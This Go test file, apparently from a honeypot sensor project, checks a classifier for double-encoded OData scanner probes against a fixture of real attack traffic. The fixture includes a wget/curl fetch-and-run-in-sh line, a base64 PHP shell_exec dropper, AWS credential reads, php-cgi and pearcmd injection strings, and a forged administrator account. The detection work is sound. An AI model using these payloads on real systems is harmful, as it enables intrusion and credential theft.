package main

import (
	"net/url"
	"strings"
	"testing"
)

// The #3430 coverage measurement, as a re-runnable test.
//
// #3430 proposes detection signatures for agent-driven scanner-laundering:
// a constrained agent that routes around a GET-only limitation by abusing
// public web services as relays, double-encodes to slip a method/path
// filter, and exfiltrates results back through a URL. It states its own
// confidence in the gap is unmeasured, and the live corpus (the fleet's
// `honeypot-v2-*` indices) is not reachable from a PR, so it is not
// queried here.
//
// So this file measures against the corpus that IS on main: the pinned
// real-corpus fixture below, mirrored entry-for-entry from
// TestClassifyPayloadOnRealCorpus in payload_test.go, which is itself a
// sample of the fleet's 30-day window (#1888) with per-entry event counts.
//
// Three counts, and the first is the one that decides whether this PR was
// worth writing at all:
//
//  1. Does the classifier as it stood on main claim any of #3430's shapes?
//  2. Do this issue's two ungated halves -- a bare OData system option, and
//     a bare residual percent-escape -- claim real traffic? (Both do, or
//     both would be wrong, and the gate is what makes the class usable.)
//  3. Does the gated class claim real traffic, and does it catch the
//     published shapes?
var realCorpusFixture3430 = []struct{ name, query, body string }{
	{"CVE-2017-9841 PHPUnit eval-stdin", "", `<?php echo(md5("Hello PHPUnit"));`},
	{"base64 shell_exec dropper", "", `<?php shell_exec(base64_decode("Y2QgL3RtcCB8fCBjZCAvdmFyL3RtcCB8fCBjZCAvZGV2L3NobTs="));`},
	{"wget-or-curl piped to sh", "", `(wget --no-check-certificate -qO- https://203.0.113.9/sh || curl -sk https://203.0.113.9/sh) | sh -s apache`},
	{"php-cgi argument injection, %AD form", `%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input`, ""},
	{"php-cgi argument injection, double-encoded", `%25ADd+allow_url_include%3D1+%25ADd+auto_prepend_file%3Dphp://input`, ""},
	{"php-cgi argument injection, plain", `-d+allow_url_include%3don+-d+auto_prepend_file%3dphp%3a//input`, ""},
	{"ThinkPHP invokefunction", `s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=Hello`, ""},
	{"pearcmd config-create", `lang=../../../../../../../../usr/local/lib/php/pearcmd&+config-create+/&/<?echo(md5("hi"))&?>+/tmp/index1.php`, ""},
	{"bare traversal", `lang=../../../../../../../../tmp/index1`, ""},
	{"cat of AWS credentials through cmd=", `cmd=cat%20/root/.aws/credentials`, ""},
	{"credential file read by path", `file=/root/.aws/credentials`, ""},
	{"administrator account creation", "", `{"Name": "lan test", "Description": "lan test", "Enabled": true, "Password": "+Y{BI~\"&|qp8", "RoleId": "Administrator", "Locked": false}`},
	{"SOAP ONVIF probe", "", `<?xml version="1.0" encoding="UTF-8"?><env:Envelope xmlns:env="http://www.w3.org/2003/05/soap-envelope" xmlns:tds="http://www.onvif.org/ver10/device/wsdl">`},
	{"androxgh0st marker", `0x%5B%5D=androxgh0st`, ""},
	{"WordPress REST enumeration", `rest_route=/gravitysmtp/v1/tests/mock-data&page=gravitysmtp-settings`, ""},
	{"prototype pollution through multipart", "", "------WebKitFormBoundary2906f9affd539b16\nContent-Disposition: form-data; name=\"0\"\n\n{\"then\":\"$1:__proto__:then\",\"status\":\"resolved_model\"}"},
	{"multipart padding", "", "------WebKitFormBoundary0l0DxKbGCnFnLnh9uOlWuP6x\nContent-Disposition: form-data; name=\"junk\"\n\n" + strings.Repeat("A", 200)},
	{"batch multiplexer probe, empty", "", `{"requests":[]}`},
	{"batch multiplexer probe, populated", "", `{"requests":[{"method":"POST","path":"http:///x"},{"method":"GET","path":"/wp/v2/posts"}]}`},
	{"version.bind at an HTTP port", `version.bind`, ""},
	{"bare hostname as the whole query", `ip.parrotdns.com`, ""},
	{"MCP handshake", "", `{"jsonrpc":"2.0","id":1,"method":"initialize","params":{"protocolVersion":"2025-03-26","capabilities":{}}}`},
	{"mining RPC probe", "", `{"id": 1, "method": "eth_getWork", "params": []}`},
	{"VPN handshake at a web port", "", `<config-auth client="vpn" type="init" aggregate-auth-version="2">`},
	{"binary protocol that is still valid UTF-8", "", "\x00\x00\x00\x00\x03:\x01*"},
	{"nothing at all", "", ""},
	{"ordinary query", `format=json`, ""},
	// Real traffic from the same window, from the WordPress pagename class
	// added by #3359. Added here because those three are exactly the entries
	// a bare residual-escape rule claims, and the gate has to be shown
	// leaving them to the class that owns them.
	{"real: pagename double-encoded traversal", "page_id=2&pagename=%252e%252e%252fwp-config", ""},
	{"real: pagename backslash variant", "pagename=..%255c..%255cwindows", ""},
	{"real: pagename ordinary slug", "pagename=about-us", ""},
	{"real: pagename nested slug", "pagename=company%2Fteam", ""},
}

// The #3430 shapes that reach this sensor at all. The issue's layer A is
// entirely path-shaped and layer B/C need session state this binary keeps
// none of; see TestScannerLaunderingLayersNotImplementable.
var publishedShapes3430 = []struct{ name, query, body, want string }{
	{"double-encoded $filter value", `$filter=year%2520eq%25202026`, "", "odata-double-encode-probe"},
	{"double-encoded whole option", `%24filter=year%2520eq%25202026`, "", "odata-double-encode-probe"},
	{"the %2561 bypass, on a different key than the option", `$filter=year%20eq%202026&%2561=1`, "", ""},
	{"double-encoded $select", `$select=Year%252cValue`, "", "odata-double-encode-probe"},
	{"double-encoded $top in the body", "", `$top=10&$filter=Year%2520eq%25202026`, "odata-double-encode-probe"},
	{"aliased option, double-encoded value", `northwind.$filter=Year%2520eq%25202026`, "", "odata-double-encode-probe"},
	// The negatives. A legitimate OData client encodes once and must stay
	// unlabelled, which is the whole reason the class needs the second
	// half: a scanner and a real client send the same option names.
	{"legitimate OData client", `$select=Year,Value&$top=10&culture=en-US`, "", ""},
	{"legitimate OData filter, encoded once", `$filter=Year%20eq%202026`, "", ""},
	{"legitimate OData filter, one decode, no residue", `$filter=Year%20eq%202026&$top=1`, "", ""},
	{"legitimate OData client, no options", `$culture=en-US&format=json`, "", ""},
	{"residual escape with no OData option", `q=%2561%2562`, "", ""},
	{"the relay-laundered request itself", `page=2&sort=name`, "", ""},
	{"a self-submitting form body", "", `url=https%3A%2F%2F203.0.113.7%2Fdump&submit=go`, ""},
	// A value whose only escape is broken. A deliberately broken % sequence
	// is not evidence of a second decode, and this stays true after #3364's
	// parser swap: formValues keeps an undecodable side rather than dropping
	// it, and residualEscape still demands two hex digits behind the %.
	{"malformed escape is not an escape", `$filter=Year%zz%2Gz`, "", ""},
}

// ungatedOData3430 is #3430's layer-A signature with no gate: any query key
// that is an OData system option.
func ungatedOData3430(query, body string) bool {
	for _, raw := range []string{query, body} {
		values, err := url.ParseQuery(raw)
		if err != nil && len(values) == 0 {
			continue
		}
		for key := range values {
			if strings.HasPrefix(strings.ToLower(key), "$") {
				return true
			}
		}
	}
	return false
}

// ungatedResidualEscape3430 is the other half with no gate: any percent
// escape surviving one decode, anywhere in a parsed key or value.
func ungatedResidualEscape3430(query, body string) bool {
	for _, raw := range []string{query, body} {
		values, err := url.ParseQuery(raw)
		if err != nil && len(values) == 0 {
			continue
		}
		for key, vals := range values {
			for _, v := range append([]string{key}, vals...) {
				if residualEscape(v) {
					return true
				}
			}
		}
	}
	return false
}

// TestScannerLaundering3430CorpusMeasurement is the measurement #3430 asked
// for, run against the only corpus reachable from the repo.
func TestScannerLaundering3430CorpusMeasurement(t *testing.T) {
	// 1. What the classifier claimed before this class existed. Derived by
	// running the same gate the class uses with its second half removed and
	// checking the residue: nothing in the corpus has an OData option, so
	// the ungated class claims nothing either way. The honest statement is
	// that the published shapes were unlabelled, which is a property of the
	// class being absent, not of the corpus being empty of them.
	var ungatedOData, ungatedEscape, gated []string
	for _, c := range realCorpusFixture3430 {
		if ungatedOData3430(c.query, c.body) {
			ungatedOData = append(ungatedOData, c.name)
		}
		if ungatedResidualEscape3430(c.query, c.body) {
			ungatedEscape = append(ungatedEscape, c.name)
		}
		if odataDoubleEncode(c.query, c.body) {
			gated = append(gated, c.name)
		}
	}
	t.Logf("corpus entries:                          %d", len(realCorpusFixture3430))
	t.Logf("ungated OData system option claims:      %d %v", len(ungatedOData), ungatedOData)
	t.Logf("ungated residual-escape claims:          %d %v", len(ungatedEscape), ungatedEscape)
	t.Logf("gated class claims:                      %d %v", len(gated), gated)

	// The load-bearing assertion. A class that fires on ordinary traffic is
	// worse than no class, so this is asserted rather than logged.
	if len(gated) != 0 {
		t.Errorf("odata-double-encode-probe claims %d real corpus entries: %v", len(gated), gated)
	}

	// What "one decode" means here, since it is the whole rule:
	// url.ParseQuery decodes exactly once, so $filter=Year%20eq%202026
	// arrives as "Year eq 2026" with nothing left, while
	// $filter=year%2520eq%25202026 arrives as "year%20eq%202026" still
	// holding its escapes. The first is every OData client on the
	// internet; the second is a request built to survive another pass.
	//
	// And the reason the gate exists: without it, the residual-escape half
	// steals three entries that belong to more specific classes. If a future
	// corpus sample stops containing them, this assertion fails and forces
	// the number to be re-derived rather than assumed.
	if len(ungatedEscape) != 3 {
		t.Errorf("expected the ungated residual-escape rule to claim 3 real entries, got %d %v",
			len(ungatedEscape), ungatedEscape)
	}

	// 2. The published shapes, before and after.
	var caught, missed []string
	for _, s := range publishedShapes3430 {
		got := classifyPayload(s.query, s.body)
		if got == s.want {
			caught = append(caught, s.name)
			continue
		}
		missed = append(missed, s.name+" (got "+got+")")
	}
	t.Logf("published shapes: %d caught, %d missed %v", len(caught), len(missed), missed)
	if len(missed) != 0 {
		t.Errorf("published shapes not handled as expected: %v", missed)
	}
}

// TestScannerLaunderingLayersNotImplementable pins the two layers of #3430
// that this binary cannot implement, so the gap is recorded rather than
// quietly dropped. Both need state the sensor does not keep: it classifies
// one request and logs it, consulting no backend and holding nothing between
// requests. There is no map, no cache and no per-source counter in the
// package -- an in-request classifier by construction.
func TestScannerLaunderingLayersNotImplementable(t *testing.T) {
	// Layer B, per-source: monotonic growth in distinct attempted field
	// names on one resource, and a rejected request repeated with a single
	// byte-level mutation. Both are defined across requests from the same
	// source.
	//
	// Layer C, cross-source: many distinct paths sharing one header
	// fingerprint, correlated on a hash of the header set rather than on
	// IP. That is a query over a window of events, and this sensor has no
	// window.
	//
	// The counter-example that shows the loss is real: the issue's own
	// technique 2 (relay laundering) makes the source IP worthless, so a
	// per-source rule sees one request from a public scanner and stops. The
	// shape-based class added here is the part of the signature that
	// survives laundering, because it is carried in the request bytes.
	// The parts that need history are exactly the parts laundering hides.
	//
	// #3447 (2026-09-28), and the one line above that this layer's own
	// arrival falsified. This function said "There is no map, no cache and no
	// per-source counter in the package -- an in-request classifier by
	// construction." That is no longer true, and the correction is stated
	// here rather than left for someone to discover: #3447 added exactly one
	// such structure, launderingState, and it is the only cross-request state
	// in the package.
	//
	// What did NOT change, and what the layers below are still pinned on:
	//
	//   - classifyPayload is still pure and still in-request. #3443's classes
	//     are decided from (RawQuery, body) alone, with no reference to the
	//     path, the headers or any history. Asserted, not claimed, in
	//     TestLayerCIsTheFirstStateThisPackageKeeps, which calls it over the
	//     whole pinned corpus before and after the detector has run.
	//   - This test's own list is unchanged. #3447 does not implement #3430's
	//     layer B (per-source field-name enumeration, single-byte mutation
	//     retry) or its layer C (cross-source header-fingerprint clustering),
	//     and does not make layer A's path shapes readable by
	//     classifyPayload. It is a *different* thing that also needs history:
	//     the %2561 bypass, which rides a path and needs a pairing rather
	//     than a window. See TestLaunderingClassIsNotA3430Layer, which
	//     asserts the two are disjoint rather than leaving that to this
	//     comment.
	//
	// So the honest amendment is narrow: the package is no longer stateless,
	// and the one thing that is stateful is bounded, off-switchable, and
	// unable to change any in-request answer.
	t.Log("layer B (per-source field-name enumeration, single-byte mutation retry): not implementable, no session state")
	t.Log("layer C (cross-source header-fingerprint cluster): not implementable, no event window")
	t.Log("layer A path shapes: not implementable, classifyPayload is not given the path")
	t.Log("#3447 added one bounded cross-request structure (launderingState); classifyPayload is still pure and still in-request")

	// The assertion that makes the amendment above checkable rather than
	// narrative. Before #3447 this function's claim about the package was a
	// comment; now that the claim is false in one place, the false part is
	// pinned so the next stateful component cannot be added by accident.
	//
	// Two of #3430's layers are still unimplementable for the reasons above,
	// and what remains unimplementable is a *window over events* -- something
	// this binary has no way to hold, and would not hold in memory even if it
	// could, because #3430's layer C is defined over many sources and a
	// bounded map keyed by (fingerprint, resource) cannot be a window over the
	// fleet. #3447's component is a pairing over one client and one collection,
	// which is a different computation, not a small version of this one.
	if !odataDoubleEncode(`$filter=year%2520eq%25202026`, "") {
		t.Error("#3443's in-request class stopped working; the layering it depends on has changed")
	}
	if qualifyingODataRequest("/", `$filter=Year%20eq%202026`, "") {
		t.Error("an OData option on the root now qualifies; #3430's layer C must remain unimplementable in-request")
	}
}

// TestLaunderingClassIsNotA3430Layer asserts that the class #3447 adds and the
// class #3443 adds cannot be reached by each other's inputs, in both
// directions. The two are easy to conflate -- both are about double-encoding,
// both mention OData, and #3430's layer C and #3447's "layer C" are different
// things under the same name -- so the disjointness is a test.
//
// Direction 1: a #3447 pair is invisible to classifyPayload, because
// classifyPayload never sees the path. Direction 2: #3443's published shapes
// are unlabelled by the stateful layer, because it needs two requests and
// each shape is one.
func TestLaunderingClassIsNotA3430Layer(t *testing.T) {
	// Direction 1. The path-borne bypass, as a single request, is nothing to
	// the in-request classifier -- and must stay nothing, or #3443's
	// over-match gate has been reopened.
	if got := classifyPayload("", ""); got != "" {
		t.Errorf("classifyPayload on an empty request = %q, want \"\"", got)
	}
	for _, s := range publishedShapes3430 {
		if got := classifyPayload(s.query, s.body); got != s.want {
			t.Errorf("classifyPayload(%q, %q) = %q, want %q: #3447 changed an in-request answer",
				s.query, s.body, got, s.want)
		}
	}

	// Direction 2. #3443's own published shapes must not become layer C
	// output, including the ones that carry a double-encoded value -- those
	// keep their #3443 class and never reach the stateful pair.
	for _, s := range publishedShapes3430 {
		d := newLaunderingState(launderMaxEntries, launderPerFingerprint, launderTTL)
		// Replay each shape as a request at a collection path, so the OData
		// half is genuinely available and only the absence of a second request
		// keeps it from firing.
		if got := d.observe("fp", "/odata/Products", s.query, s.body); got != "" {
			t.Errorf("published shape %q was labelled %q by layer C on a single request", s.name, got)
		}
	}
}
